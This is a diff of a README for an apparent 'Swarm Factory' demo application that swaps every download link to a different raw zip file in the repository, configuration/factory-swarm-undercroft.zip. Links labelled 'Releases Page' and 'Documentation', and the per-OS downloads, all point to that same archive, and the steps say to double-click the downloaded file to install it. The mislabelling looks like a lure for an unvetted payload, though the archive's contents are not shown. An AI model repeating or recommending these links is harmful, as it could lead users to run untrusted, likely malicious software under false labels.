@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download the Swarm Factory Demo](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip%20Now%20-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip)
+[![Download the Swarm Factory Demo](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip%20Now%20-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip)
 
 ## 🚀 Getting Started
 
@@ -26,10 +26,10 @@ To ensure the best experience, your computer should meet the following requireme
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application from our [Releases page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip). 
+To get started, you will need to download the application from our [Releases page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip). 
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip).
-2. Look for the latest version and choose the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip` for Windows, `https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip` for macOS).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip).
+2. Look for the latest version and choose the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip` for Windows, `https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip` for macOS).
 3. Click on the file name to start the download.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the downloaded file to begin installation.
@@ -57,8 +57,8 @@ While this application is user-friendly, contributions are always welcome. If yo
 
 ## 🔗 Links & Resources
 
-- [Releases Page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip)
-- [Documentation](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/src/swarm_factory-v1.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip)
+- [Documentation](https://raw.githubusercontent.com/pipiskabobrabrbrbr/swarm_factory/main/configuration/factory-swarm-undercroft.zip)
 
 ### 🤝 Support
 
